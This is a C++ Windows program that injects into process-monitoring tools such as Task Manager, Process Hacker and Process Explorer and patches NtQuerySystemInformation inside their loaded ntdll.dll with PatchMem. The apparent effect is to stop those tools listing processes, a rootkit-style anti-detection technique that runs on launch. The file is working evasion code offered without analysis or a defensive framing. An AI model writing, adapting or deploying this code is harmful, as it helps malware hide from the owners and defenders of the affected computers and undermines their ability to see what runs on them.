#include <Windows.h>
#include <TlHelp32.h>
#include <vector>

DWORD GetProcId(const wchar_t* procName)
{
	DWORD procId = 0;
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap != INVALID_HANDLE_VALUE)
	{
		PROCESSENTRY32 procEntry;
		procEntry.dwSize = sizeof(procEntry);
		//loop through all process
		if (Process32First(hSnap, &procEntry))
		{

			do
			{
				//compare current lopping process name with procName parameters
				if (!_wcsicmp(procEntry.szExeFile, procName))
				{
					procId = procEntry.th32ProcessID;
					break;
				}
			} while (Process32Next(hSnap, &procEntry));
		}
	}
	//close handle and return the procId of the process
	CloseHandle(hSnap);
	return procId;
}

uintptr_t GetModuleBaseAddress(DWORD procId, const wchar_t* modName)
{
	uintptr_t modBaseAddr = 0;
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, procId);
	if (hSnap != INVALID_HANDLE_VALUE)
	{
		MODULEENTRY32 modEntry;
		modEntry.dwSize = sizeof(modEntry);
		if (Module32First(hSnap, &modEntry))
		{
			do
			{
				//same thing that GetProcId but for module
				if (!_wcsicmp(modEntry.szModule, modName))
				{
					modBaseAddr = (uintptr_t)modEntry.modBaseAddr;
					break;
				}


			} while (Module32Next(hSnap, &modEntry));
		}
	}
	//close handle and return moduleBaseAddress
	CloseHandle(hSnap);
	return modBaseAddr;
}

void PatchMem(BYTE* lpAddress, BYTE* src, unsigned int sizeofinstruction, HANDLE hProcess)
{
	//variable for stock the old protection
	DWORD oldProtection;
	//change the memory protection
	VirtualProtectEx(hProcess, lpAddress, sizeofinstruction, PROCESS_VM_READ | PROCESS_VM_WRITE, &oldProtection);
	//write instruction
	WriteProcessMemory(hProcess, lpAddress, src, sizeofinstruction, 0);
	//set the old protection
	VirtualProtectEx(hProcess, lpAddress, sizeofinstruction, oldProtection, &oldProtection);
}

std::vector<const wchar_t*> ProcessMgr = { L"ProcessHacker.exe",L"TaskMgr.exe",L"procexp.exe",L"procexp64.exe",L"procexp64a.exe" };

int hide()
{
	for (int i = 0; i < ProcessMgr.size(); i++)
	{
		int procId = GetProcId(ProcessMgr[i]);
		if (procId)
		{
			HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procId);
			if (hProc && hProc != INVALID_HANDLE_VALUE)
			{
				uintptr_t ntdllBase = GetModuleBaseAddress(procId, L"ntdll.dll"); // get base address of ntdll in one of the ProcessMgr Process
				uintptr_t myNtQueryInformationProcessRVA = (uintptr_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation"); // Get our own NtQuerySystemInformation Address
				uintptr_t NtQueryInformationProcessRVA = (myNtQueryInformationProcessRVA - GetModuleBaseAddress(GetProcessId(GetCurrentProcess()), L"ntdll.dll")); // calculate the rva
				PatchMem((BYTE*)(ntdllBase + NtQueryInformationProcessRVA) + 0x3, (BYTE*)"\xB8\x35\x00\x00\x00", 5, hProc); // patch it
			}
		}
	}
	return 0;
}

int APIENTRY wWinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPWSTR lpCmdLine,int nCmdShow)
{
	hide();
}
